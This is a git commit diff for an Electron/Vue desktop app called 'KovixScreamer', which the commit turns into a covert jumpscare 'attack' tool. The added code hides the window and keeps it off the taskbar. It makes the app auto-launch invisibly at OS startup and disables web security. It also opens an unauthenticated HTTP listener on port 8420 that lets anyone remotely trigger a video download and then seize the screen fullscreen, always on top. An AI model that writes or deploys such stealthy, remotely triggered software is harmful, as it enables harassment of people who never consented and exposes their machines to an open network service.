09ca57dcc61aba9511fe614c6e6ca41025ff5ffa
Diego Segovia <segoviadiegomatias@gmail.com>
2019-05-01 20:13:33 -0300

    START - asustovix attack

--- src/background.ts
+++ src/background.ts
@@ -1,40 +1,48 @@
-'use strict'
+import { app, protocol, BrowserWindow, ipcMain } from 'electron';
+import { createProtocol, installVueDevtools } from 'vue-cli-plugin-electron-builder/lib';
+const isDevelopment = process.env.NODE_ENV !== 'production';
 
-import { app, protocol, BrowserWindow } from 'electron'
-import {
-  createProtocol,
-  installVueDevtools
-} from 'vue-cli-plugin-electron-builder/lib'
-const isDevelopment = process.env.NODE_ENV !== 'production'
+app.commandLine.appendSwitch('autoplay-policy', 'no-user-gesture-required');
+app.commandLine.appendSwitch('--autoplay-policy','no-user-gesture-required');
 
 // Keep a global reference of the window object, if you don't, the window will
 // be closed automatically when the JavaScript object is garbage collected.
-let win: BrowserWindow | null
+let win: BrowserWindow | null;
 
 // Standard scheme must be registered before the app is ready
-protocol.registerStandardSchemes(['app'], { secure: true })
+protocol.registerStandardSchemes(['app'], { secure: true });
 function createWindow () {
   // Create the browser window.
   win = new BrowserWindow({
     fullscreen: true,
+    center: true,
     autoHideMenuBar: true,
     resizable: false,
-    backgroundColor: '#000'
+    backgroundColor: '#000',
+    webPreferences: {
+      webSecurity: false
+    }
   });
+
+  if(!isDevelopment){
+    win.hide();
+    win.setSkipTaskbar(true);
+    win.setFullScreen(true);
+  }
 
   if (process.env.WEBPACK_DEV_SERVER_URL) {
     // Load the url of the dev server if in development mode
-    win.loadURL(process.env.WEBPACK_DEV_SERVER_URL as string)
-    if (!process.env.IS_TEST) win.webContents.openDevTools()
+    win.loadURL(process.env.WEBPACK_DEV_SERVER_URL as string);
+    if (!process.env.IS_TEST) win.webContents.openDevTools();
   } else {
-    createProtocol('app')
+    createProtocol('app');
     // Load the index.html when not in development
-    win.loadURL('app://./index.html')
+    win.loadURL('app://./index.html');
   }
 
   win.on('closed', () => {
     win = null
-  })
+  });
 }
 
 if(!app.requestSingleInstanceLock()) app.quit();
@@ -45,24 +53,24 @@ app.on('second-instance', ()=>{
     win.center();
     win.focus();
   }
-})
+});
 
 // Quit when all windows are closed.
 app.on('window-all-closed', () => {
   // On macOS it is common for applications and their menu bar
   // to stay active until the user quits explicitly with Cmd + Q
   if (process.platform !== 'darwin') {
-    app.quit()
+    app.quit();
   }
-})
+});
 
 app.on('activate', () => {
   // On macOS it's common to re-create a window in the app when the
   // dock icon is clicked and there are no other windows open.
   if (win === null) {
-    createWindow()
+    createWindow();
   }
-})
+});
 
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
@@ -71,25 +79,88 @@ app.on('ready', async () => {
   if (isDevelopment && !process.env.IS_TEST) {
     // Install Vue Devtools
     try {
-      await installVueDevtools()
+      await installVueDevtools();
     } catch (e) {
-      console.error('Vue Devtools failed to install:', e.toString())
+      console.error('Vue Devtools failed to install:', e.toString());
     }
   }
-  createWindow()
-})
+  createWindow();
+  onInit();  
+});
 
 // Exit cleanly on request from parent process in development mode.
 if (isDevelopment) {
   if (process.platform === 'win32') {
     process.on('message', data => {
       if (data === 'graceful-exit') {
-        app.quit()
+        app.quit();
       }
     })
   } else {
     process.on('SIGTERM', () => {
-      app.quit()
+      app.quit();
     })
   }
 }
+
+function getVideoPath(name: any){
+  const path = require('path');
+  return path.join(app.getPath('userData'), `${name}.mp4`);
+}
+
+function onInit() {
+  // Set kovix jumpscare to auto launch at OS startup
+  const AutoLaunch = require('auto-launch');
+  new AutoLaunch({
+    name: 'KovixScreamer',
+    isHidden: true
+  }).enable();
+
+  // Express listener
+  const express = require('express');
+  const bodyParser = require('body-parser');
+  const api = express();
+  api.use(bodyParser.json());
+
+  const fs = require('fs');
+  const ytdl = require('ytdl-core');
+
+  ipcMain.on('asustovix', () => {
+    if(win) {
+      win.setFullScreen(true)
+      win.setSkipTaskbar(false);
+      win.center();
+      win.show();
+      win.focus();
+      win.setAlwaysOnTop(true);
+    }
+  });
+
+  ipcMain.on('readyToPlay', (event: any) => {
+
+    api.post('/asustovix', (req: any, res: any) => {
+      if(!req.body) return res.send('Pasame un body gato');
+      if(!req.body.videoUrl) return res.send('Pasame un link de youtube gato');
+      if(!req.body.name) return res.send('Pasame un filename para el video gato');
+      if(!ytdl.validateURL(req.body.videoUrl)) return res.send('El link de youtube no es valido');
+
+      let options = {
+        quality: 'highest',
+        filter: (format: any) => format.container === 'mp4'
+      }
+      if(req.body.options) options = { ...options, ...req.body.options };
+      
+      const videoStream = ytdl(req.body.videoUrl, options);    
+      videoStream.pipe(fs.createWriteStream(getVideoPath(req.body.name)));
+      
+      videoStream.on('end', () => {
+        event.sender.send('readyToPlay', getVideoPath(req.body.name));
+        res.send('Asustadovix');
+      });
+    });
+
+  });
+
+  api.listen(8420);
+}
+  
--- src/views/Home.vue
+++ src/views/Home.vue
@@ -1,106 +1,43 @@
 <template>
   <div class="home">
-    <youtube :video-id="videoId" ref="youtube"
-            @ended="toggleFullScreen(false)"
-            @paused="toggleFullScreen(false)"
-            @playing="toggleFullScreen(true)"></youtube>
-    <div class="actions" v-if="!isFullScreen">
-      <br/>
-      <input type="text" placeholder="Video id" v-model="videoId">
-      <input type="number" placeholder="Random max" v-model="randomMax">
-      <input type="number" placeholder="Lucky number" v-model="luckyNumber">
-      
-      <template v-if="videoId && randomMax && luckyNumber">
-        <button v-on:click="startRandomJumpscare()">start Random Jumpscare</button>
-      </template>
-      <button v-on:click="stopRandomJumpscare()">stop Random Jumpscare</button>
-    </div>
+    <video class="videoPlayer" id="videoPlayer">
+      <!-- <source src="name-of-the-wind-animated.mp4" type="video/mp4"> -->
+    </video>
   </div>
 </template>
 
 <script lang="ts">
 import { Component, Vue, Watch } from 'vue-property-decorator';
-import HelloWorld from '@/components/HelloWorld.vue'; // @ is an alias to /src
-import { remote , app } from 'electron';
+import { remote, ipcRenderer } from 'electron';
 
-@Component({
-  components: {
-    HelloWorld,
-  }
-})
+@Component({})
 export default class Home extends Vue {
-  public videoId: string = 'zI9ysnXh_Ps'; // Example: tlThdr3O5Qo
-  public randomMax: number = 50;
-  public luckyNumber: number = 25;
-  public playerVars: any = { autoplay: 1 }
-  public randomLoop: any;
-  public isFullScreen: boolean = false;
 
-  get player() {
-    const obj: any = this.$refs.youtube;
-    return obj.player;
-  }
+  created(){
+    ipcRenderer.on('readyToPlay', (event: any, src: any) => {
+      console.log(`Playing video file from "${src}"`);
+      const videoPlayer: any = document.getElementById("videoPlayer");
+      videoPlayer.src = `file:///${src}`;
+      videoPlayer.oncanplaythrough = () => {
+        console.log('Can play through');
+        videoPlayer.play();
+        ipcRenderer.send('asustovix');
+      }
+    });
 
-  public toggleFullScreen(isFullScreen: any){
-    let bounds:any = remote.getCurrentWindow();
-    bounds = bounds.webContents.getOwnerBrowserWindow().getBounds();
-
-    this.isFullScreen = isFullScreen;
-    if(isFullScreen){
-      this.player.setSize(bounds.width, bounds.height);
-    } else {
-      this.player.setSize(bounds.width * 0.6, bounds.height * 0.5);
-    }
-  }
-
-  startRandomJumpscare(){
-    this.goInvisible();
-    setTimeout(()=>{
-      this.triggerJumpScare();
-    }, 60000 * 60)
-  }
-
-  rollDice(){
-    const randomNumber = Math.floor((Math.random() * this.randomMax) + 1);
-    if(randomNumber == this.luckyNumber) this.triggerJumpScare();
-  }
-
-  triggerJumpScare(){
-    this.playVideo();
-    this.goVisible();
-  }
-
-  goVisible(){
-    remote.getCurrentWindow().setFullScreen(true)
-    remote.getCurrentWindow().setSkipTaskbar(false);
-    remote.getCurrentWindow().center()
-    remote.getCurrentWindow().show();
-    remote.getCurrentWindow().focus()
-  }
-
-  goInvisible(){
-    app.dock.hide();
-    remote.getCurrentWindow().hide();
-    remote.getCurrentWindow().setSkipTaskbar(true);
-  }
-
-  stopRandomJumpscare(){
-    clearInterval(this.randomLoop);
-    this.goVisible();
-  }
-
-  playVideo() {
-    this.player.playVideo();
-  }
-
-  playing() {
-    console.log('trolled!!!');
+    ipcRenderer.send('readyToPlay');
+    console.log('Ready to play');
   }
 }
 </script>
 
 <style scoped lang="scss">
-.actions {
-  background-color: white;
+.home {
+  min-width: 100%; 
+  min-height: 100%;
+  .videoPlayer {
+    min-width: 100%; 
+    min-height: 100%;
+  }
 }
 </style>
